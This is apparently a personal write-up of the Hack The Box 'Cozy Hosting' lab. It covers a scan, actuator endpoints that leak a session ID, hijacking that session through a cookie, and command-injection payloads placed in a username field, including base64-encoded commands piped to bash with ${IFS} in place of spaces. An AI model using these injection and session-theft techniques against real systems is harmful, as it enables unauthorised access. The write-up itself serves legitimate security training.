# Cozy Hosting

> IP: [10.10.11.230]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.230 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to http://cozyhosting.htb
         2. Need to add this to our /etc/hosts file
3. HTTP
   1. Navigate to website and inspect source code
   2. LOGIN PAGE
      1. UN: admin
      2. PW: password
      3. In the url we see /login?error
   3. XSS
      1. Test the login form for xss
         1. PAYLOAD: <script>alert(1);</script>
         2. Nothing
   4. COOKIE
      1. We also see a JSESSION cookie and a value
         1. Couldn't crack this
   5. GOBUSTER
      1. > gobuster dir -x php,txt,html -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         1. index
         2. login
         3. admin
         4. logout
         5. error
   6. DIRSEARCH
      1. > dirsearch -u cozyhosting.htb
         1. /actuator

            ```json
                {"_links":{"self":{"href":"http://localhost:8080/actuator","templated":false},"sessions":{"href":"http://localhost:8080/actuator/sessions","templated":false},"beans":{"href":"http://localhost:8080/actuator/beans","templated":false},"health":{"href":"http://localhost:8080/actuator/health","templated":false},"health-path":{"href":"http://localhost:8080/actuator/health/{*path}","templated":true},"env":{"href":"http://localhost:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://localhost:8080/actuator/env/{toMatch}","templated":true},"mappings":{"href":"http://localhost:8080/actuator/mappings","templated":false}}}
            ```

         2. /actuator/env
         3. /actuator/health
         4. /actuator/sessions

            ```json
                {
                    "57C683F9031DDF4AE4065F40FCE64B2B":"UNAUTHORIZED",
                    "103649C33456367C6B155F698492F80C":"UNAUTHORIZED",
                    "A6D2D52E081B6F28DE8609C145EA8019":"UNAUTHORIZED",
                    "CC19EC16BD5CD02F1EA22D5638FAF803":"UNAUTHORIZED",
                    "BC3017EB68D249F75677E524F3CC00D5":"kanderson",
                    "F26F459B923D1C512526E9B6B4F97C30":"UNAUTHORIZED",
                    "DF4AE9608E4C2C93725F68EAC4F7D5E1":"UNAUTHORIZED"}
            ```

            1. Maybe these sessions refer to PHP Sessions like interms of our cookie
4. BURPSUITE
   1. Proxy -> Intercept -> "Cookie: JSESSIONID=BC3017EB68D249F75677E524F3CC00D5"
   2. Success! We are now logged into the admin dashboard
      1. In here we see a HOSTNAME & USERNAME input field
   3. ADMIN DASHBOARD
      1. HOSTNAME: 127.0.0.1
      2. USERNMAE: (I testetd several different names, but if I left it blank we got this response)
         1. REQUEST: We can see the request being sent is to /executessh
         2. RESPONSE:

        ```text
            usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]
        ```

        1. So it looks like it is running ssh commands
   4. TRIAL AND ERROR
      1. For the hostname lets try and use our attack machine to see if it pings back to us
         1. HOSTNAME: MY_IP_ADDR
            1. INVALID-HOSTNAME
      2. For the hostname lets try the victim machine IP address
         1. HOSTNAME: 10.10.11.230
         2. USERNAME: [COMMAND-HERE]
            1. Commands tested:
               1. test; `whoami`
                  1. RSEPONSE: "error=Username%20can%27t%20contain%20whitespaces!"
                  2. So can't have whitespaces
               2. test;`whoami`
                  1. RESPONSE: "ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: app@10.10.11.230: command not found"
                  2. So couldn't run the command

## HELP NEEDED CREDIT @Aniket Das for his help / writeup hints

1. So I was definitely on the right track, however we needed to go a step further by base64 encoding our payload and using "${IFS}" for whitespace
2. BASE64 TEST
   1. > echo "whoami" | base64
      1. RESPONSE: d2hvYW1pCg==
3. PAYLOAD
   1. HOST: 10.10.11.230
   2. USER: test;`d2hvYW1pCg==`
      1. Did not work
4. PAYLAOD 2.0
   1. HOST: 10.10.11.230
   2. USER: echo${IFS}`d2hvYW1pCg==|base64${IFS}-d|bash`

## QUESTIONS

1. User flag
   1. ``
2. Root flag
   1. ``
